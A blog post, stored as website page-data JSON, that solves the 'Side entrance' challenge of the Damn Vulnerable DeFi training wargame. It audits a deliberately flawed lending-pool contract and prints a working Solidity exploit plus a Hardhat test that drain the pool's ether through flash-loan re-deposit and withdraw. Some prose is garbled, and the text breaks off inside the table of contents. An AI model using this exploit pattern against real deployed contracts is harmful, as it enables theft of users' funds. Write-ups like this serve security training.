{
    "componentChunkName": "component---src-templates-blog-template-js",
    "path": "/defi-wargame-4/",
    "result": {"data":{"cur":{"id":"a01aab9f-e080-5ff9-96b1-69fd595a5201","html":"<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAAsTAAALEwEAmpwYAAACgklEQVQoz1WRy2vTcADHf8076bK26WtL0iS/pG0Wu67r1lfarl3XbK61bl3ZqkPn6jarMhTnwQeCCCLowBdevHjz4EUPoqID0YteJvgEERTRg+DRf0Ckzovw4Xv7fA/fL7hycGczl3dwRpezj3UZrMtwuCOenhjni3p6Bjlf1OWNurz9nC/q9sec7m19qanF87cm2udUqwUUQfe6giihIISMEIoNlwhG4wMJvzAUgJkATPeKw71iQpBTsmbyUiKarDWOXJg+dsmYPQ5sfzWMgjitYhQkaBWnIE5BjFJYpyHISVkzZc2UYFoN5WTVVEO5aHoqVWkFi/MApVXcEUGJIMAl1B4GqARwuZOIAFCxg01A8E47yWg4BW02HqMgRquMQweGWW8sn7QmV2KZeqHenqguF3cslba3SuWmma9nR2bGJ/dEBsoYBQHopSglFbcwSkZJSHeFgBqvNPauTVYPDGUbY/WVgrVgzbStSiuTm44nKqKS0sJ5p6efYUM6TFUrq1/efJdhASA86zSAYJTM6mKy0IwmauHsnBK2sqPzw+laLF7mpSSCSzZEADbexyc/PXiyee/dy6e/V9s3EVIhmSBwSCanj3vk0W5vklUtj5D3BouiVnB7IyipYJRKMBpKKnZuYGF5ff3i4xtXX51eu93DpwEeAIf2nTpx9PJsbU1QR91GhYclvz6m6GWn22C6QygJO/NQkGA0vzgSG9xVzLdSw03OPWSnY+Dns/e/Xnz7cPft4YWzYrjs8MRpto9mwwSj4vQ/c4utC1l7QurePeA6k+Gug807G18fvf6x8fn+tYe6WgSYiFEKSioo9Z+JURAlIeMIRwL754LPl/SPdXnjD9Uyf5VnRCIaAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"the-side-entrance-contract\"\n        title=\"the-side-entrance-contract\"\n        src=\"/static/a3cc9519cd6945ba181c32b7c2da3f97/37523/c4.png\"\n        srcset=\"/static/a3cc9519cd6945ba181c32b7c2da3f97/e9ff0/c4.png 180w,\n/static/a3cc9519cd6945ba181c32b7c2da3f97/f21e7/c4.png 360w,\n/static/a3cc9519cd6945ba181c32b7c2da3f97/37523/c4.png 720w,\n/static/a3cc9519cd6945ba181c32b7c2da3f97/e996b/c4.png 1050w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><strong>Wargame Provider: @tinchoabbate</strong></p>\n<blockquote>\n<p>Challenge #4 — Side entrance</p>\n</blockquote>\n<p>A surprisingly simple lending pool allows anyone to deposit ETH, and withdraw it at any point in time.\nThis very simple lending pool has 1000 ETH in balance already, and is offering free flash loans using the deposited ETH to promote their system.\nYou must take all ETH from the lending pool.</p>\n<h2 id=\"code-audit\" style=\"position:relative;\"><a href=\"#code-audit\" aria-label=\"code audit permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Code Audit</h2>\n<blockquote>\n<p>SideEntranceLenderPool.sol</p>\n</blockquote>\n<h3 id=\"dependency\" style=\"position:relative;\"><a href=\"#dependency\" aria-label=\"dependency permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Dependency</h3>\n<ul>\n<li>The address contract of the openzeppelin library is used as a dependency.</li>\n</ul>\n<h3 id=\"state-variable\" style=\"position:relative;\"><a href=\"#state-variable\" aria-label=\"state variable permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>State Variable</h3>\n<p><code class=\"language-text\">mapping (address=>uint256) private balances</code></p>\n<ul>\n<li>It is used for flash Loan Pool management and cannot be accessed from outside because it is a private access indicator.</li>\n</ul>\n<h3 id=\"functions\" style=\"position:relative;\"><a href=\"#functions\" aria-label=\"functions permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Functions</h3>\n<p><code class=\"language-text\">fuction deposit() external payable</code></p>\n<ul>\n<li>You can see that the <code class=\"language-text\">msg.value</code> value is filled in for each address of <code class=\"language-text\">msg.sender</code> as a key value in the state variable balances mapping. Anyone from the outside can call this function to populate the balances mapping with a payable directive, making <code class=\"language-text\">ether</code> tradable.</li>\n</ul>\n<p><code class=\"language-text\">function withdraw() external</code></p>\n<ul>\n<li>In the state variable balances mapping, the value is extracted based on the corresponding <code class=\"language-text\">msg.sender</code> key and assigned to the <code class=\"language-text\">amountToWithdraw</code> variable.</li>\n<li>Logically, it is a logic configuration that allows withdrawal/withdrawal while managing the user’s balance through the balances variable.</li>\n<li>After temporarily matching the allocation of <code class=\"language-text\">amountToWithdraw</code>, a local variable, the <code class=\"language-text\">balances</code> mapping value of the address is initialized to 0.</li>\n<li>You can see that the value is passed to <code class=\"language-text\">msg.sender</code> while executing the last line of <code class=\"language-text\">payable(msg.sender).sendValue(amountToWithdraw).</code></li>\n</ul>\n<p>In this part, we use the sendValue method for sending ether . Let’s analyze it in depth. It is implemented as a method inside the <code class=\"language-text\">openzeppelin/&lt;->/Address.sol</code> module. As stated in the development specification, the call command is used to transmit ether on the internal logic. Basically, each method transfer, send, call is used to send ether.</p>\n<h3 id=\"the-big-differences-are\" style=\"position:relative;\"><a href=\"#the-big-differences-are\" aria-label=\"the big differences are permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>The big differences are:</h3>\n<ul>\n<li>\n<p>transfer : Consumes 2300 gas, and an error occurs in case of failure</p>\n</li>\n<li>\n<p>send : consumes 2300 gas, returns true or false whether success or not</p>\n</li>\n<li>\n<p>call : Consuming variable gas and receiving <code class=\"language-text\">_to</code> Ether. Use the form <code class=\"language-text\">_to.call{value: msg.value, gas:}(””).</code> Gas is unspecified due to reentrancy attack.</p>\n</li>\n</ul>\n<p>If the SLOAD operation consumes 5000 gas, transfer, send cannot be used, so the call command is used.</p>\n<p>If the <code class=\"language-text\">SLOAD</code> operation consumes 5000 gas, <code class=\"language-text\">transfer, send</code> cannot be used, so the <code class=\"language-text\">call</code> command is used.</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// **OMIT**</span>\n<span class=\"token comment\">/**\n     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to\n     * `recipient`, forwarding all available gas and reverting on errors.\n     *\n     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost\n     * of certain opcodes, possibly making contracts go over the 2300 gas limit\n     * imposed by `transfer`, making them unable to receive funds via\n     * `transfer`. {sendValue} removes this limitation.\n     *\n     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].\n     *\n     * IMPORTANT: because control is transferred to `recipient`, care must be\n     * taken to not create reentrancy vulnerabilities. Consider using\n     * {ReentrancyGuard} or the\n     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">sendValue</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">payable</span> recipient<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance <span class=\"token operator\">>=</span> amount<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Address: insufficient balance\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span> success<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> recipient<span class=\"token punctuation\">.</span>call<span class=\"token punctuation\">{</span>value<span class=\"token punctuation\">:</span> amount<span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>success<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Address: unable to send value, recipient may have reverted\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token comment\">// **OMIT**</span></code></pre></div>\n<p><code class=\"language-text\">function flashLoan(uint256 amount) external</code></p>\n<p>✅ After allocating the ether value of the current contract to the value of the <code class=\"language-text\">amount</code> variable received as a parameter and the local variable <code class=\"language-text\">balanceBefore</code>, check whether the loan can be proceeded by comparison.</p>\n<ul>\n<li>Call the <code class=\"language-text\">execute</code> function defined in the <code class=\"language-text\">IFlashLoanEtherReceiver(msg.sender).execute{value: amount}()</code> Interface. In this case, the <code class=\"language-text\">amount</code> variable received as a parameter is used for the <code class=\"language-text\">value</code> property value. However, the <code class=\"language-text\">execute</code> function is not implemented internally, so it does not perform specific handling.</li>\n</ul>\n<p>✅ At the end of the flash Loan logic, it is determined whether the loan has been properly collected.</p>\n<h2 id=\"vulnerability\" style=\"position:relative;\"><a href=\"#vulnerability\" aria-label=\"vulnerability permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>vulnerability</h2>\n<p>It could be seen that the flash Loan logic was not implemented properly. Because handling is not implemented, it does not work properly, and if an attacker triggers by deploying a contract that arbitrarily implements the <code class=\"language-text\">execute</code> function, an attack outside of the actual logic is possible.</p>\n<p>Next, the <code class=\"language-text\">deposit/withdraw</code> functions can control the <code class=\"language-text\">balances</code> mapping value in a form that anyone can use externally. At this time, by applying the <code class=\"language-text\">payable(msg.sender).sendValue(…)</code> pattern implemented in the <code class=\"language-text\">withdraw</code> function, the attacker can become a medium through which ether can be delivered to the implemented contract.</p>\n<h2 id=\"solve\" style=\"position:relative;\"><a href=\"#solve\" aria-label=\"solve permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Solve</h2>\n<p>Build an exploit contract to handle the target contract. Since the <code class=\"language-text\">execute</code> function is called by calling the <code class=\"language-text\">flashLoan</code> function in the attack target logic, the <code class=\"language-text\">flashLoan</code> function is called first.</p>\n<ol>\n<li>\n<p><code class=\"language-text\">target.flashLoan(address(target).balance);</code> ← Because ether is actually stored as the target contract’s balance value, the value is passed, and when the execute function is executed, the value is converted to the target contract’s balance. Make settings.</p>\n</li>\n<li>\n<p>When jumping to the execute function address, internally, by depositing the value before the exploit contract address, it is saved in the ‘balances’ mapping of the target contract. At this point, the address of the exploit contract distributed by the attacker is set as the key value, and the ether value of the SideEntranceLenderPool contract is set as the “value” value.</p>\n</li>\n<li>\n<p>After returning the call, call <code class=\"language-text\">target.withdraw()</code> to extract the ether value assigned to the <code class=\"language-text\">balances</code> mapping and send the ether to the actual exploit contract address. (target contract <ether> → exploit contract)</p>\n</li>\n<li>\n<p>Since we moved the ether, we steal all the balance by sending it again to the attacker’s address.</p>\n</li>\n</ol>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.8.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@openzeppelin/contracts/utils/Address.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"./SideEntranceLenderPool.sol\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Exploit</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">using</span> <span class=\"token class-name\">Address</span> <span class=\"token keyword\">for</span> <span class=\"token builtin\">address</span> <span class=\"token keyword\">payable</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">execute</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">SideEntranceLenderPool</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>deposit<span class=\"token punctuation\">{</span>value<span class=\"token punctuation\">:</span> msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">exploit</span><span class=\"token punctuation\">(</span>SideEntranceLenderPool target<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token punctuation\">{</span>\n        target<span class=\"token punctuation\">.</span><span class=\"token function\">flashLoan</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        target<span class=\"token punctuation\">.</span><span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">payable</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">sendValue</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token function\">receive</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<div class=\"gatsby-highlight\" data-language=\"tsx\"><pre class=\"language-tsx\"><code class=\"language-tsx\"><span class=\"token keyword\">const</span> <span class=\"token punctuation\">{</span> ethers <span class=\"token punctuation\">}</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'hardhat'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">const</span> <span class=\"token punctuation\">{</span> expect <span class=\"token punctuation\">}</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'chai'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">const</span> <span class=\"token punctuation\">{</span> Contract <span class=\"token punctuation\">}</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'ethers'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token function\">describe</span><span class=\"token punctuation\">(</span><span class=\"token string\">'[Challenge] Side entrance'</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\n    <span class=\"token keyword\">let</span> deployer<span class=\"token punctuation\">,</span> attacker<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">const</span> <span class=\"token constant\">ETHER_IN_POOL</span> <span class=\"token operator\">=</span> ethers<span class=\"token punctuation\">.</span>utils<span class=\"token punctuation\">.</span><span class=\"token function\">parseEther</span><span class=\"token punctuation\">(</span><span class=\"token string\">'1000'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">// const Exploit = contract.fromArtifactName('Exploit');</span>\n\n    <span class=\"token function\">before</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">async</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">/** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */</span>\n        <span class=\"token punctuation\">[</span>deployer<span class=\"token punctuation\">,</span> attacker<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span><span class=\"token function\">getSigners</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">const</span> exploit <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span><span class=\"token function\">getContractFactory</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Exploit'</span><span class=\"token punctuation\">,</span> attacker<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>exploit <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> exploit<span class=\"token punctuation\">.</span><span class=\"token function\">deploy</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">const</span> SideEntranceLenderPoolFactory <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span><span class=\"token function\">getContractFactory</span><span class=\"token punctuation\">(</span><span class=\"token string\">'SideEntranceLenderPool'</span><span class=\"token punctuation\">,</span> deployer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>pool <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> SideEntranceLenderPoolFactory<span class=\"token punctuation\">.</span><span class=\"token function\">deploy</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n        <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>pool<span class=\"token punctuation\">.</span><span class=\"token function\">deposit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span> value<span class=\"token operator\">:</span> <span class=\"token constant\">ETHER_IN_POOL</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>attackerInitialEthBalance <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span>provider<span class=\"token punctuation\">.</span><span class=\"token function\">getBalance</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token function\">expect</span><span class=\"token punctuation\">(</span>\n            <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span>provider<span class=\"token punctuation\">.</span><span class=\"token function\">getBalance</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>pool<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>to<span class=\"token punctuation\">.</span><span class=\"token function\">equal</span><span class=\"token punctuation\">(</span><span class=\"token constant\">ETHER_IN_POOL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">it</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Exploit'</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">async</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">/** CODE YOUR EXPLOIT HERE */</span>\n        <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>exploit<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">exploit</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>pool<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">after</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">async</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">/** SUCCESS CONDITIONS */</span>\n        <span class=\"token function\">expect</span><span class=\"token punctuation\">(</span>\n            <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span>provider<span class=\"token punctuation\">.</span><span class=\"token function\">getBalance</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>pool<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>to<span class=\"token punctuation\">.</span>be<span class=\"token punctuation\">.</span><span class=\"token function\">equal</span><span class=\"token punctuation\">(</span><span class=\"token string\">'0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n        <span class=\"token comment\">// Not checking exactly how much is the final balance of the attacker,</span>\n        <span class=\"token comment\">// because it'll depend on how much gas the attacker spends in the attack</span>\n        <span class=\"token comment\">// If there were no gas costs, it would be balance before attack + ETHER_IN_POOL</span>\n        <span class=\"token function\">expect</span><span class=\"token punctuation\">(</span>\n            <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span>provider<span class=\"token punctuation\">.</span><span class=\"token function\">getBalance</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>to<span class=\"token punctuation\">.</span>be<span class=\"token punctuation\">.</span><span class=\"token function\">gt</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>attackerInitialEthBalance<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre></div>\n<h2 id=\"next-time-\" style=\"position:relative;\"><a href=\"#next-time-\" aria-label=\"next time  permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>next time.. 🚀</h2>\n<p>I will continue to post auditing and research on 12 challenge defi Smart Contracts.</p>\n<p>Thank you for the @tinchoabbate that made a good wargame.\n<a href=\"https://www.damnvulnerabledefi.xyz/\">Damn Vunlerable Defi</a></p>\n<div class=\"table-of-contents\">\n<ul>\n<li>\n<p><a href=\"#code-audit\">Code Audit</a></p>\n<ul>\n<li><a href=\"#dependency\">Dependency</a></li>\n<li><a href=\"#state-variable\">State Variable</a></li>\n<li><a 